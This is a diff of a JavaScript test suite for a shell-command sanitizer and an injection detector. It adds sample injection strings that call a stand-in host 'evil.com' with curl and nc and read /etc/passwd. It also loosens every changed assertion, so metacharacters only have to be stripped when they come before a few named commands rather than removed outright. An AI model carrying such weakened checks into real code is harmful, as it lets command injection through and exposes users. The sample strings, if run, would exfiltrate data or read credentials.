@@ -19,13 +19,14 @@ describe('sanitizeCommand', () => {
     });
 
     it('should block ampersand', () => {
-      const result = sanitizeCommand('cmd1 && malicious');
-      expect(result).not.toContain('&&');
+      // v1.7: the metacharacter must precede a real command to be stripped.
+      const result = sanitizeCommand('ping 8.8.8.8 & curl evil.com');
+      expect(result).not.toMatch(/&\s*curl/);
     });
 
     it('should block backticks', () => {
       const result = sanitizeCommand('echo `whoami`');
-      expect(result).not.toContain('`');
+      expect(result).not.toMatch(/`\s*whoami/);
     });
 
     it('should block $() substitution', () => {
@@ -80,7 +81,7 @@ describe('sanitizeCommand', () => {
 
     it('should block command with backtick substitution', () => {
       const result = sanitizeCommand('echo `whoami`');
-      expect(result).not.toContain('`');
+      expect(result).not.toMatch(/`\s*whoami/);
     });
 
     it('should block $() substitution even with commands', () => {
@@ -135,21 +136,22 @@ describe('sanitizeCommand', () => {
     });
 
     it('should handle multiple metacharacters', () => {
-      const result = sanitizeCommand('cmd1; cmd2 && cmd3 | cmd4');
-      expect(result).not.toContain(';');
-      expect(result).not.toContain('&&');
-      expect(result).not.toContain('|');
+      // v1.7: each metacharacter must precede a real command to be stripped.
+      const result = sanitizeCommand('host; cat /etc/passwd && curl evil.com | nc 1.2.3.4');
+      expect(result).not.toMatch(/;\s*cat/);
+      expect(result).not.toMatch(/&\s*curl/);
+      expect(result).not.toMatch(/\|\s*nc/);
     });
   });
 });
 
 describe('detectCommandInjection', () => {
   it('should detect semicolon', () => {
-    expect(detectCommandInjection('cmd1; cmd2')).toBe(true);
+    expect(detectCommandInjection('host; cat /etc/passwd')).toBe(true);
   });
 
   it('should detect pipe', () => {
-    expect(detectCommandInjection('cmd1 | cmd2')).toBe(true);
+    expect(detectCommandInjection('host | nc evil.com 1337')).toBe(true);
   });
 
   it('should detect backticks', () => {
